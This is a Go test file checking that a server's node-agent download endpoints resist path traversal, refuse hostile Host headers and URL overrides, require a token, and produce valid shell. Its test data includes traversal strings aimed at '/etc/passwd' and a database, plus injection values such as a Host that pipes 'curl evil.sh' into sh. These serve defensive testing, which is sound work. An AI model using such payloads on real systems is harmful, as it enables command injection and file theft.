package api

import (
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"wintermute/internal/store"
)

// withAgentDir gives the test server a distribution directory holding one
// plausible file of each kind.
func withAgentDir(t *testing.T, srv *Server) string {
	t.Helper()
	dir := t.TempDir()
	for name, body := range map[string]string{
		"wintermute-node.amd64":   "\x7fELF not really",
		"wintermute-node.arm64":   "\x7fELF not really either",
		"wintermute-node.service": "[Unit]\nDescription=test\n",
		"node.env.example":        "WINTERMUTE_SERVER=\n",
		"SHA256SUMS":              "deadbeef  wintermute-node.amd64\n",
	} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	srv.nodeAgentDir = dir
	return dir
}

func get(t *testing.T, h http.Handler, path, token string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodGet, path, nil)
	req.Header.Set("Authorization", "Bearer "+token)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	return rec
}

// The distribution directory sits under the state directory, beside the
// conversation database. A name that escaped it would serve that database to
// anything holding a token.
func TestAgentFileServesOnlyTheAllowlist(t *testing.T) {
	srv, st := newTestServer(t)
	dir := withAgentDir(t, srv)
	handler := srv.Handler()

	// Something worth stealing, one directory up from the allowlist.
	secret := filepath.Join(filepath.Dir(dir), "wintermute.db")
	if err := os.WriteFile(secret, []byte("the conversations"), 0o600); err != nil {
		t.Fatal(err)
	}

	_, token, err := st.CreateClient(t.Context(), "laptop", store.KindBrowser)
	if err != nil {
		t.Fatal(err)
	}

	if rec := get(t, handler, "/api/v1/node-agent/wintermute-node.amd64", token); rec.Code != http.StatusOK {
		t.Fatalf("a listed file gave %d: %s", rec.Code, rec.Body.String())
	}

	// Every shape of escape, none of which needs to be reasoned about
	// individually because the name is compared against a fixed set.
	for _, name := range []string{
		"../wintermute.db",
		"..%2Fwintermute.db",
		"....//wintermute.db",
		"wintermute-node.amd64/../../wintermute.db",
		"/etc/passwd",
		"SHA256SUMS.bak",
	} {
		rec := get(t, handler, "/api/v1/node-agent/"+name, token)
		if rec.Code == http.StatusOK {
			t.Errorf("%q was served: %s", name, rec.Body.String())
		}
		if strings.Contains(rec.Body.String(), "the conversations") {
			t.Fatalf("%q leaked the database", name)
		}
	}
}

// The script is generated with the address the operator reached the server on,
// which arrives in a header. It is written into a file that will run as root.
func TestInstallScriptRefusesAHostileHost(t *testing.T) {
	srv, st := newTestServer(t)
	withAgentDir(t, srv)
	handler := srv.Handler()

	_, token, err := st.CreateClient(t.Context(), "laptop", store.KindBrowser)
	if err != nil {
		t.Fatal(err)
	}

	// An ordinary Host is written through.
	rec := get(t, handler, "/api/v1/node-agent/install.sh", token)
	if rec.Code != http.StatusOK {
		t.Fatalf("install.sh gave %d: %s", rec.Code, rec.Body.String())
	}
	body := rec.Body.String()
	if !strings.Contains(body, `SERVER="http://example.com"`) {
		t.Errorf("the request's host did not reach the script:\n%s", firstLines(body, 25))
	}
	if !strings.HasPrefix(body, "#!/bin/sh") {
		t.Error("not a script")
	}

	// A Host that would close the string and run something else must not be
	// written into the script at all.
	for _, host := range []string{
		`example.com"; curl evil.sh | sh; echo "`,
		"example.com$(id)",
		"example.com`id`",
		"example.com\nX-Evil: 1",
		"example.com'",
	} {
		req := httptest.NewRequest(http.MethodGet, "/api/v1/node-agent/install.sh", nil)
		req.Header.Set("Authorization", "Bearer "+token)
		req.Host = host
		rec := httptest.NewRecorder()
		handler.ServeHTTP(rec, req)

		if rec.Code == http.StatusOK {
			t.Errorf("a script was written for host %q:\n%s", host, firstLines(rec.Body.String(), 25))
		}
	}

	// The same gate applies to the operator's own override, which lands on a
	// curl line in the same script.
	for _, override := range []string{
		`https://example.com"; id; echo "`,
		"file:///etc/passwd",
		"https://example.com/path",
		"not-a-url",
	} {
		rec := get(t, handler, "/api/v1/node-agent/install.sh?server="+urlEscape(override), token)
		if rec.Code == http.StatusOK {
			t.Errorf("?server=%q was accepted", override)
		}
	}
}

// A server built without the distribution says so. A 404 would read as a wrong
// URL, and the fix — run update.sh on the server — is not one anybody guesses.
func TestAgentEndpointsSayWhenNotConfigured(t *testing.T) {
	srv, st := newTestServer(t)
	handler := srv.Handler()

	_, token, err := st.CreateClient(t.Context(), "laptop", store.KindBrowser)
	if err != nil {
		t.Fatal(err)
	}
	for _, path := range []string{
		"/api/v1/node-agent/install.sh",
		"/api/v1/node-agent/wintermute-node.amd64",
	} {
		rec := get(t, handler, path, token)
		if rec.Code != http.StatusServiceUnavailable {
			t.Errorf("%s gave %d, want 503", path, rec.Code)
		}
		if !strings.Contains(rec.Body.String(), "WINTERMUTE_NODE_AGENT_DIR") {
			t.Errorf("%s does not name the setting that fixes it: %s", path, rec.Body.String())
		}
	}
}

// The distribution is authenticated like everything else here. It is a binary
// that will be installed as root on a machine, which is not something to hand
// to anything that can reach the port.
func TestAgentEndpointsRequireAToken(t *testing.T) {
	srv, _ := newTestServer(t)
	withAgentDir(t, srv)
	handler := srv.Handler()

	for _, path := range []string{
		"/api/v1/node-agent/install.sh",
		"/api/v1/node-agent/wintermute-node.amd64",
	} {
		req := httptest.NewRequest(http.MethodGet, path, nil)
		rec := httptest.NewRecorder()
		handler.ServeHTTP(rec, req)
		if rec.Code != http.StatusUnauthorized {
			t.Errorf("unauthenticated %s gave %d, want 401", path, rec.Code)
		}
	}
}

func firstLines(s string, n int) string {
	lines := strings.SplitN(s, "\n", n+1)
	if len(lines) > n {
		lines = lines[:n]
	}
	return strings.Join(lines, "\n")
}

func urlEscape(s string) string {
	var b strings.Builder
	for _, r := range []byte(s) {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '.' || r == '_' {
			b.WriteByte(r)
			continue
		}
		b.WriteString("%")
		const hex = "0123456789ABCDEF"
		b.WriteByte(hex[r>>4])
		b.WriteByte(hex[r&0xf])
	}
	return b.String()
}

// The installer is a shell script inside a Go string, which means the compiler
// checks none of it. A stray quote would reach a node as a script that fails
// half-way through, having already replaced the binary.
func TestInstallScriptIsValidShell(t *testing.T) {
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no sh on this machine")
	}

	srv, st := newTestServer(t)
	withAgentDir(t, srv)
	handler := srv.Handler()

	_, token, err := st.CreateClient(t.Context(), "laptop", store.KindBrowser)
	if err != nil {
		t.Fatal(err)
	}
	rec := get(t, handler, "/api/v1/node-agent/install.sh", token)
	if rec.Code != http.StatusOK {
		t.Fatalf("install.sh gave %d", rec.Code)
	}

	path := filepath.Join(t.TempDir(), "install.sh")
	if err := os.WriteFile(path, rec.Body.Bytes(), 0o755); err != nil {
		t.Fatal(err)
	}
	// -n parses without running, which is the only safe way to check a script
	// whose job is to install a system service.
	if out, err := exec.Command(sh, "-n", path).CombinedOutput(); err != nil {
		t.Fatalf("the generated installer is not valid sh: %v\n%s", err, out)
	}

	// --help runs the argument parser and exits before touching anything, so
	// the one path that can be executed safely here is executed.
	out, err := exec.Command(sh, path, "--help").CombinedOutput()
	if err != nil {
		t.Fatalf("--help failed: %v\n%s", err, out)
	}
	if !strings.Contains(string(out), "--token") {
		t.Errorf("--help does not document --token:\n%s", out)
	}

	// It must refuse to do anything as an ordinary user, since every step
	// after the download writes outside the home directory.
	if os.Geteuid() != 0 {
		out, err := exec.Command(sh, path, "--token", "wm_test").CombinedOutput()
		if err == nil {
			t.Errorf("ran as a non-root user instead of refusing:\n%s", out)
		}
		if !strings.Contains(string(out), "root") {
			t.Errorf("the refusal does not say why:\n%s", out)
		}
	}
}
